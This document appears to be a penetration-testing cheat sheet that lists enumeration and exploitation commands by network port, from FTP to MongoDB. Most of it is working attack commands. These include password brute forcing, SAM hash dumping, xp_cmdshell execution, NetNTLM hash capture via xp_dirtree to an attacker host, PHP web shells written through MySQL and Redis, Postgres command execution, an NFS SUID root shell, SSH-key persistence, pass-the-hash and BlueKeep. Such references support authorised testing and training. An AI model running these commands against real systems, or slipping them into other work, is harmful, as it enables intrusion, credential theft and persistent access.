# Service Enumeration — [Back to Recon](recon_main.md)

See [Web Enumeration](web_enumeration.md) for HTTP/HTTPS.

---

## 21 — FTP

```bash
nmap --script "ftp-*" -p 21 $IP

# Anonymous login (common misconfiguration)
ftp anonymous@$IP          # password: anything or blank
# Passive mode issues? use -A flag in ftp client

# Brute force
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP ftp -t 10
```

**With creds — FTP commands:**
```
ls -la       get <file>      put <file>
cd <dir>     mget *          binary (switch to binary mode)
```

> Can you write to a web root? Upload a web shell.

---

## 22 — SSH

```bash
# Enum supported auth methods
nmap --script ssh-auth-methods -p 22 $IP

# Brute force (slow — SSH rate-limits)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP ssh -t 4

# Check for weak algorithms (older systems)
nmap --script ssh2-enum-algos -p 22 $IP
```

**With creds / key:**
```bash
ssh user@$IP
ssh -i id_rsa user@$IP
ssh -i id_rsa -p 2222 user@$IP

# Crack encrypted private key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> Check `~/.ssh/authorized_keys` for persistence. If you can write to it, add your key.

---

## 25 / 587 — SMTP

```bash
nmap --script smtp-commands,smtp-enum-users -p 25 $IP

# User enumeration (VRFY / RCPT TO)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
smtp-user-enum -M RCPT -D domain.local -U users.txt -t $IP

# Manual
nc $IP 25
EHLO test
VRFY root
VRFY admin
```

> Valid usernames feed into password spray. Open relay can send phishing.

---

## 53 — DNS

```bash
# Zone transfer (dumps all DNS records — often misconfigured)
dig axfr @$IP $DOMAIN
dnsrecon -d $DOMAIN -t axfr -n $IP

# Reverse lookup
dig -x $IP @$IP

# Brute force subdomains
dnsrecon -d $DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -n $IP
```

> Zone transfer gives full internal hostnames and IPs — huge info gain.

---

## 79 — Finger

```bash
finger @$IP
finger root@$IP
finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
```

---

## 110 / 995 — POP3

```bash
nmap --script pop3-capabilities,pop3-ntlm-info -p 110 $IP
nc $IP 110
USER admin
PASS password
LIST
RETR 1     # read email 1
```

---

## 111 — RPCBind / NFS

```bash
rpcinfo -p $IP
showmount -e $IP        # list NFS exports
```

See [NFS section](#2049--nfs) for mounting.

---

## 135 — MSRPC

```bash
nmap --script msrpc-enum -p 135 $IP
impacket-rpcdump -p 135 $IP     # enumerate RPC endpoints
impacket-rpcdump -p 445 $IP
```

---

## 139 / 445 — SMB

```bash
# Enumerate without creds
nmap --script smb-vuln* --script-args=unsafe=1 -p 445 $IP
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 $IP

# List shares (null session)
nxc smb $IP -u '' -p ''
smbclient -N -L \\\\$IP
smbmap -H $IP

# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 $IP
```

**Guest auth (distinct from null session — some configs allow Guest but not null):**
```bash
nxc smb $IP -u Guest -p ''
nxc smb $IP -u Guest -p '' --shares
```

**With creds:**
```bash
nxc smb $IP -u user -p 'password'
nxc smb $IP -u user -p 'password' --shares
nxc smb $IP -u user -p 'password' --users
nxc smb $IP -u user -p 'password' --sam           # dump local hashes (admin needed)
nxc smb $IP -u user -p 'password' -x "whoami"     # execute command

# Connect to share
smbclient \\\\$IP\\ShareName -U user
# Recursive listing
smbclient \\\\$IP\\ShareName -U 'user%password' -c 'recurse ON; ls'
# Recursive download
smbclient \\\\$IP\\ShareName -U user -c 'prompt OFF;recurse ON;mget *'

# spider_plus — recursively crawl and download all accessible share content
nxc smb $IP -u user -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/smb MAX_FILE_SIZE=5000000
# Works with Guest too: -u Guest -p ''

# Mount share
mount -t cifs //$IP/ShareName /mnt/smb -o username=user,password=pass
```

**smbclient commands:** `ls`, `cd`, `get <file>`, `put <file>`, `allinfo <file>` (shows alternate data streams)

> `nxc smb --sam` dumps local SAM hashes. EternalBlue = unauthenticated SYSTEM shell.

---

## 161 / 162 — SNMP (UDP)

```bash
# Default community strings public/private often unchanged; no auth in v1/v2c
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
snmpwalk -v 2c -c public $IP
snmpwalk -v 2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # Windows users
snmpwalk -v 2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v 2c -c public $IP 1.3.6.1.2.1.6.13.1.3    # open TCP ports
```

> Leaks usernames, running processes, installed software, network interfaces — feed into password spray.

---

## 389 / 636 — LDAP

```bash
# Anonymous bind (often allowed on AD)
ldapsearch -x -H ldap://$IP -b "" -s base          # get base DN
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=*)" | grep -i "dn\|cn\|mail\|description"

# Enumerate users
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=person)" sAMAccountName description
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=computer)"
```

**With creds:**
```bash
ldapsearch -x -H ldap://$IP -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=person)"
```

> Description fields often contain plaintext passwords. Anonymous LDAP on AD = user enumeration.

---

## 443 — HTTPS

```bash
# Check certificate for hostnames / subdomains
openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "DNS:|Subject:"
testssl.sh $IP    # full SSL/TLS vuln scan
```

---

## 873 — Rsync

```bash
nmap --script rsync-list-modules -p 873 $IP
rsync rsync://$IP/                         # list modules
rsync -av rsync://$IP/module/ /tmp/loot/   # download

# With creds
rsync -av --password-file=pass.txt rsync://user@$IP/module/ /tmp/
# Upload (if write enabled)
rsync -av /tmp/shell.php rsync://$IP/module/webroot/
```

---

## 1433 — MSSQL

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -p 1433 $IP
```

**No creds — check for empty SA password:**
```bash
nxc mssql $IP -u sa -p ''
impacket-mssqlclient sa:@$IP
```

**Validate creds:**
```bash
nxc mssql $IP -u user -p 'password'              # domain/Windows auth
nxc mssql $IP -u user -p 'password' --local-auth # SQL Server auth (not Windows auth)
```

**With creds:**
```bash
impacket-mssqlclient user:'password'@$IP
impacket-mssqlclient user:'password'@$IP -windows-auth   # Windows/AD auth

# In mssqlclient shell:
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;
USE database; SELECT * FROM table;

# Enable and run xp_cmdshell (RCE as mssql service account)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Capture NetNTLM hash — forces outbound SMB auth from the SQL service account
# Run Responder first: responder -I eth0 -wd
EXEC xp_dirtree '\\$LHOST\share';
EXEC master..xp_dirtree '\\$LHOST\share\file.txt'   # alternate syntax
```

> xp_cmdshell = OS command execution. xp_dirtree = steal NetNTLM hash.

**Post-compromise: SQL Server error log credential hunting**

SQL Server logs the username field verbatim for every failed login (Error 18456). If a user typed their password into the username field, it appears in plaintext in the log.

```powershell
# Default log location (adjust MSSQL version/instance name)
type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG"
type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG.BAK"

# Custom log path — check startup params in the log file header or registry:
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s | findstr /i "errorlogpath"

# Filter for failed logins — any that look like passwords are worth testing
Select-String -Path "C:\...\ERRORLOG*" -Pattern "18456" | Select-String -NotMatch "domain\\"
```

Look for consecutive 18456 events: first with a recognizable username, then immediately with a string that looks like a password. The second "username" is the credential.

---

## 1521 — Oracle TNS

```bash
nmap --script oracle-tns-version,oracle-sid-brute -p 1521 $IP
```

**PT ONLY — full auto scan:**
```bash
odat all -s $IP     # enumerate SIDs, brute creds, test for RCE
```

---

## 2049 — NFS

```bash
showmount -e $IP
mkdir /mnt/nfs
mount -t nfs $IP:/export/share /mnt/nfs
ls -la /mnt/nfs
```

**PrivEsc if `no_root_squash` is set:**
```bash
# On LHOST (as root):
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On RHOST:
/share/bash -p    # drops to root shell
```

---

## 3306 — MySQL

```bash
nmap --script mysql-info,mysql-empty-password,mysql-enum -p 3306 $IP

# Connect (try root with no password)
mysql -u root -h $IP
mysql -u root -p -h $IP
```

**With creds:**
```sql
show databases;
use <db>;
show tables;
select * from <table>;

-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write web shell (requires secure_file_priv to be empty or allow path)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

---

## 3389 — RDP

```bash
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 $IP

# Connect
xfreerdp /u:user /p:'password' /v:$IP /cert:ignore +clipboard /dynamic-resolution

# Pass-the-Hash
xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:$IP /cert:ignore

# Brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP rdp -t 4
```

**PT ONLY:**
```bash
# BlueKeep (CVE-2019-0708) — unauthenticated RCE on unpatched 2003/7/2008
msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## 5432 — PostgreSQL

```bash
nmap --script pgsql-brute -p 5432 $IP
psql -h $IP -U postgres
```

**With creds:**
```sql
\l                    -- list databases
\c <database>         -- connect
\dt                   -- list tables
SELECT * FROM <table>;

-- RCE as superuser
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Read file
SELECT pg_read_file('/etc/passwd');
```

---

## 5985 / 5986 — WinRM

```bash
nxc winrm $IP -u user -p 'password'
nxc winrm $IP -u user -H <NTLM_HASH>

# Shell
evil-winrm -i $IP -u user -p 'password'
evil-winrm -i $IP -u user -H <NTLM_HASH>    # pass-the-hash

# Upload/download inside evil-winrm
upload /local/file C:\dest\file
download C:\remote\file /local/dest/
```

---

## 6379 — Redis

```bash
redis-cli -h $IP
redis-cli -h $IP -a 'password'   # if auth required

# No-auth exploitation:
info server
keys *
get <keyname>

# Write web shell (if web root known)
config set dir /var/www/html
config set dbfilename shell.php
set shell "<?php system($_GET['cmd']); ?>"
save

# Write SSH key (if .ssh dir writable)
config set dir /root/.ssh
config set dbfilename authorized_keys
set ssh "\n\nssh-rsa AAAA... kali@kali\n\n"
save
```

---

## 27017 — MongoDB

```bash
nmap --script mongodb-info,mongodb-databases -p 27017 $IP

# Unauthenticated (common on older installs)
mongosh $IP:27017
```

**Commands:**
```
show dbs
use <database>
show collections
db.<collection>.find().pretty()
db.<collection>.findOne()
```

**With creds:**
```bash
mongosh $IP:27017 -u admin -p 'password' --authenticationDatabase admin
```
